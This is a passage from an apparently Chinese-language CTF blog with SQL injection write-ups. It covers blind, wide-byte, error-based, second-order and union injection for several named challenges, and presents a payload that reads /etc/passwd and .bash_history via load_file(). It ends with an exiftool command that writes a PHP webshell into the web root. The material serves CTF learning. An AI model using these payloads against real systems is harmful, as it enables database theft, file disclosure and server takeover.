    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        payload <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
        a <span class="token operator">=</span> <span class="token string">"%df%27;set @a=0x&#123;&#125;;prepare a from @a; execute a;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>a<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p>
<h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt loading="lazy"></p>
<p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt loading="lazy"></p>
<p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt loading="lazy"></p>
<p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p>
<p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p>
<p>查库：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt loading="lazy"></p>
<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whewherere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt loading="lazy"></p>
<p>由此可知flag应该在f14g中</p>
<p>查字段：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt loading="lazy"></p>
<blockquote>
<p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p>
</blockquote>
<p>解密MD5值后为id</p>
<p>id列查询：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>b80bb7740288fda1f201890375a60c8f<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt loading="lazy"></p>
<p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p>
<p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p>
<p>flag列查询：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt loading="lazy"></p>
<p>base64解密后为“The first man name was k”。。。。。。。。。。</p>
<p>配合limit进行查询，在limit 22,1处发现flag</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt loading="lazy"></p>
<p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p>
<p>于是用到substr()函数进行字符串的截取：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt loading="lazy"></p>
<p>去掉相同的拼合起来base64解码后即可得到flag</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="网鼎杯-2018—Comment"><a href="#网鼎杯-2018—Comment" class="headerlink" title="网鼎杯 2018—Comment"></a>网鼎杯 2018—Comment</h3><p>上来先扫描一波，扫到了<code>.git</code>，<code>index.php</code>，<code>login.php</code>，<code>git</code>源码泄露，用<code>Githack</code>工具进行恢复</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt loading="lazy"></p>
<p>发现case后的直接break了，什么操作都没有，估计这份代码不全，使用<code>git</code>进行恢复</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p>
<p>找到历史commit版本，进行代码恢复，得到最终<code>write_do.php</code>源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>write</code>操作对应发帖，<code>comment</code>操作对应评论操作，但是在进行这些操作的前提是要登录上，于是我们看到登录界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161906786.png" alt loading="lazy"></p>
<p>两个提示似乎在暗示这什么，于是对密码的三个*出处进行爆破，得到密码<code>zhangwei666</code>成功登录，来到发帖界面，首先我们看发帖操作，用<code>addslashes</code>函数对参数进行了过滤，说到<code>addslashes</code>引发的安全问题可以查看这篇文章：<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">https://bbs.ichunqiu.com/thread-10899-1-1.html</a></p>
<p>里面介绍了绕过<code>addslashes</code>函数的方法，但在这里似乎用不到，仔细观察代码，<code>addslashes</code>函数限制了我们对一些特殊符号的操作，使得sql语句能够正常的执行，但并没有改变插入到数据库中的数据，测试如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509163056815.png" alt loading="lazy"></p>
<p>可以看到并不会改变存入数据库中的内容，查询出里面的结果也是一样，于是我们再看到<code>commit</code>操作，里面的<code>mysql_fetch_array</code>函数在数据库中取出<code>category</code>字段中的内容，然后再直接进行了<code>insert into</code>存入评论数据的操作操作传入的参数<code>category</code>我们可，后面的<code>content</code>参数我们也可控于是就可以进行如下操作：</p>
<p>先传入<code>category</code>字段的值为<code>a&#39;,content=(select user()),/*</code>,前面的单引号虽然在存入数据库的过程中被转义了，但是数据库中华存的依旧是用来的内容，后面的取出来的时候也会将单引号原封不动的取出来，在进行<code>comment</code>的<code>insert into</code>操作时候，就会闭合前面的单引号，从而达到注入的目的，然后跟上的<code>content</code>值当然就是要进行<code>sql</code>注入查找数据的操作，然后再接上<code>/*</code>，这样我们后面再评论页面进行评论的时候传入<code>*/#</code>就能成功的和前面的闭合起来，总<code>payload</code>如下：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into comment set category &#x3D; &#39;a&#39;,content&#x3D;(select user()),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>

<p>得到回显：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509164939746.png" alt loading="lazy"></p>
<p>尝试写马无果，应该是权限不够，然后再ctf数据库查到三个表<code>board,comment,user</code></p>
<p><code>user</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,username,password,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string</code></pre>

<p><code>board</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,category,title,content</code></pre>

<p><code>comment</code>表中有如下列</p>
<pre class="language-none"><code class="language-none">id,bo_id,category,content</code></pre>

<p>经过一番查找后并没有发现存在<code>flag</code>的内容，看来<code>flag</code>并没在数据库中，不在数据库中那只能在文件中了，于是进行文件读取操作，根目录下并没有<code>flag</code>，于是我们左试右试都没发现<code>flag</code>，于是读取<code>/etc/passwd</code></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),&#x2F;*</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt loading="lazy"></p>
<p><code>/etc/passwd</code>文件描述参考：<a href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell">Linux passwd 文件详解</a></p>
<p>注意到最后一行，<code>www:x:500:500:www:/home/www:/bin/bash</code>www用户在<code>/home/www</code>的目录下进行了<code>/bin/bash</code>的<code>shell</code>操作，于是我们利用<code>.bash_history</code>查找用户使用过的历史命令</p>
<ul>
<li><code>.bash_history</code>：保存了当前用户使用过的历史命令,方便查找，参考：<a href="https://blog.csdn.net/caolaosanahnu/article/details/7601074">linux中Shell历史命令记录文件的路径是什么</a></li>
</ul>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;),&#x2F;*</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt loading="lazy"></p>
<p>可以到进行了如上操作，切换到<code>/tmp</code>目录下，解压<code>html.zip</code>的压缩包，删除压缩包，复制<code>html</code>目录及其子目录到<code>/var/www/html</code>目录下，然后删除了<code>.DS_Store</code>文件，开启<code>Apache</code>服务</p>
<ul>
<li><code>.DS_Store</code>：Mac OS 保存文件夹的自定义属性的隐藏文件</li>
</ul>
<p>这个过程看上去没毛病，但是中间漏了一点，<code>/tmp</code>目录下了<code>html</code>文件夹中的<code>.DS_Store</code>文件并没用被删除，于是我们尝试读取这个文件，直接读取在页面上回显并不完全</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt loading="lazy"></p>
<p>于是通过<code>hex</code>方式进行读取</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</code></pre>

<p>得到一长串十六进制数字，放到网站上转文本</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt loading="lazy"></p>
<p>可以看到应该存放<code>flag</code>的文件，进行读取</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;),&#x2F;*</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt loading="lazy"></p>
<p>成功拿到flag</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt loading="lazy"></p>
<p>题目给出的提示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt loading="lazy"></p>
<p>随便登录后在前端HTML中都能看到这样一串字母</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre>

<p>base32解码后得到</p>
<pre class="language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</code></pre>

<p>base64解码后得到</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span></code></pre>

<p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p>
<p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p>
<p>利用以下注入语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">name: admin<span class="token string">' And 1>2 union select '</span><span class="token number">1</span><span class="token string">','</span>admin<span class="token string">','</span>c4ca4238a0b923820dcc509a6f75849b
pw: <span class="token number">1</span></code></pre>

<p>注：</p>
<ul>
<li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li>
<li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li>
<li>过滤了and可以用大写And绕过</li>
<li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li>
</ul>
<p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" loading="lazy">

<p>于是这时输入password=1即可绕过查询得到flag</p>
<h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p>
<p>参考：<a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入">你没见过的注入</a></p>
<p>再看到文件列表显示的界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt loading="lazy"></p>
<p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p>
<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/">https://exiftool.org/</a></p>
<p>可以编辑图片的的<code>EXIF</code>信息</p>
<p>payload：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./exiftool -overwrite_original -comment<span class="token operator">=</span><span class="token string">"y1ng<span class="token entity" title="\&quot;">\"</span>');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';#"</span> <span class="token number">1</span>.jpg</code></pre>

<p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt loading="lazy"></p>
<p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt loading="lazy"></p>
